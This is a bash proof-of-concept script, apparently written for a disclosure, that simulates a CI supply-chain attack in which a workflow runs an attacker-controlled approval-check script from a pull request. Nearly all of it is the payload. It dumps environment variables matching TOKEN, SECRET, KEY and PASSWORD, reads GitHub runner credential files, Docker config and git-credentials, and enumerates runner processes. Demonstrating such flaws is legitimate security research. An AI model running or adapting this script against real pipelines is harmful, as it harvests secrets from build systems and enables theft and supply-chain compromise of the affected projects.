#!/bin/bash
echo "=== PoC #3: Approval Check Supply Chain Attack (Paddle Pattern) - v2 ==="
echo "[*] Simulating: checkout attacker PR HEAD -> execute ci/check_approval.sh"
echo ""
echo "[+] Runner identity:"
whoami && hostname && id
echo ""
echo "[+] GITHUB_TOKEN & secrets exposure (from env):"
env | grep -iE "TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|GITHUB_" | sort | head -30
echo ""
echo "[+] Runner working directory & config files:"
echo "  RUNNER_WORKSPACE=${RUNNER_WORKSPACE}"
echo "  GITHUB_WORKSPACE=${GITHUB_WORKSPACE}"
echo "  RUNNER_TEMP=${RUNNER_TEMP}"
# 只在 runner 根目录查找，不做全盘扫描
RUNNER_ROOT=$(dirname "$(dirname "${RUNNER_WORKSPACE:-/home/github/actions-runner/_work}")")
echo "  RUNNER_ROOT=$RUNNER_ROOT"
ls -la "$RUNNER_ROOT" 2>/dev/null | head -20
echo ""
echo "[+] Runner credentials (targeted lookup):"
for f in "$RUNNER_ROOT/.credentials" "$RUNNER_ROOT/.credentials_rsaparams" "$RUNNER_ROOT/.runner" "$RUNNER_ROOT/.env"; do
  if [ -f "$f" ]; then
    echo "  FOUND: $f"
    head -3 "$f" 2>/dev/null
  fi
done
echo ""
echo "[+] Docker credentials:"
cat ~/.docker/config.json 2>/dev/null || echo "  (no docker config)"
echo ""
echo "[+] Git credentials:"
git config --global --list 2>/dev/null | grep -i credential || echo "  (none)"
cat ~/.git-credentials 2>/dev/null || echo "  (no git-credentials file)"
echo ""
echo "[+] Runner processes:"
ps aux 2>/dev/null | grep -E "Runner.Listener|Runner.Worker|actions-runner" | grep -v grep | head -5
echo ""
echo "=== End PoC #3 v2 ==="
